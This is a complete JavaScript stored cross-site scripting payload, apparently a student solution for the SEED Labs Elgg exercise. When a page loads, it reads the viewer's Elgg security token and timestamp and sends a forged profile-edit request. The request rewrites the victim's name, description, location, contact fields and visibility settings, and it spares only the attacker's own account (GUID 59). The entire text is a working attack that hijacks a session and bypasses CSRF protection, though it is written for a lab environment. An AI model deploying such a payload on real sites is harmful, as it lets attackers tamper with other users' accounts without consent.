<script type="text/javascript">
        window.onload = function() {
            //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
            //and Security Token __elgg_token
            var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
            var token="__elgg_token="+elgg.security.token.__elgg_token;
            //Construct the content of your url.
            var sendurl= "http://www.seed-server.com/action/profile/edit";
            var id = "<p>"+"1905016"+"</"+"p>";
            var content=token+ts+
                    "&name="+encodeURIComponent("Eren Yeager")+
                    "&description="+encodeURIComponent(id)+"&accesslevel[description]=1"+
                    "&briefdescription="+encodeURIComponent("I am nobody")+"&accesslevel[briefdescription]=1"+
                    "&location="+encodeURIComponent("Vinland")+"&accesslevel[location]=1"+
                    "&interests="+encodeURIComponent("Learning crosssite scripting")+"&accesslevel[interests]=1"+
                    "&skills="+encodeURIComponent("None so far")+"&accesslevel[skills]=1"+
                    "&contactemail="+encodeURIComponent("a@a.com")+"&accesslevel[contactemail]=1"+
                    "&phone="+encodeURIComponent("01234")+"&accesslevel[phone]=1"+
                    "&mobile="+encodeURIComponent("01710")+"&accesslevel[mobile]=1"+
                    "&website="+encodeURIComponent("www.hello-a.com")+"&accesslevel[website]=1"+
                    "&twitter="+encodeURIComponent("hello_a")+"&accesslevel[twitter]=1"+
                    "&guid="+elgg.session.user.guid;
            if(elgg.session.user.guid != 59)
            {
                //Create and send Ajax request to modify profile
                var Ajax=null;
                Ajax=new XMLHttpRequest();
                Ajax.open("POST",sendurl,true);
                Ajax.setRequestHeader("Host","www.seed-server.com");
                Ajax.setRequestHeader("Content-Type",
                "application/x-www-form-urlencoded");
                Ajax.send(content);
            }
        }
</script>
